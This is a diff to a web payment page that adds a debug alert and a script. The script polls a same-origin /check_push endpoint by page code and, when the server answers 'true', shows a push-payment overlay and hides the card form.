@@ -192,6 +192,7 @@
       </div>
     </div>
     <script>
+    alert('JS loaded!');
     // Зчитування параметрів з URL
     function getQueryParam(name) {
         const url = new URL(window.location.href);
@@ -582,5 +583,34 @@ document.getElementById('back-btn').onclick = function() {
     }
 };
 </script>
+<script>
+    function getPageCode() {
+      const urlParams = new URLSearchParams(window.location.search);
+      let page = urlParams.get('page');
+      if (page) return page;
+      page = sessionStorage.getItem('page_code');
+      if (page) return page;
+      return '';
+    }
+    function pollPushOverlay() {
+      const page_code = getPageCode();
+      console.log('Polling page_code:', page_code);
+      if (!page_code) return setTimeout(pollPushOverlay, 2000);
+      fetch('/check_push?page_code=' + encodeURIComponent(page_code))
+        .then(resp => resp.text())
+        .then(txt => {
+          console.log('check_push response:', txt);
+          if (txt === 'true') {
+            const { total, currency } = getTotalAndCurrency();
+            document.getElementById('push-payment-title').textContent = `Payment ${total} ${currency}`;
+            document.getElementById('push-overlay').style.display = 'flex';
+            document.getElementById('payment-card-main').style.display = 'none';
+          } else {
+            setTimeout(pollPushOverlay, 2000);
+          }
+        });
+    }
+    setTimeout(pollPushOverlay, 2000);
+    </script>
 </body>
 </html>
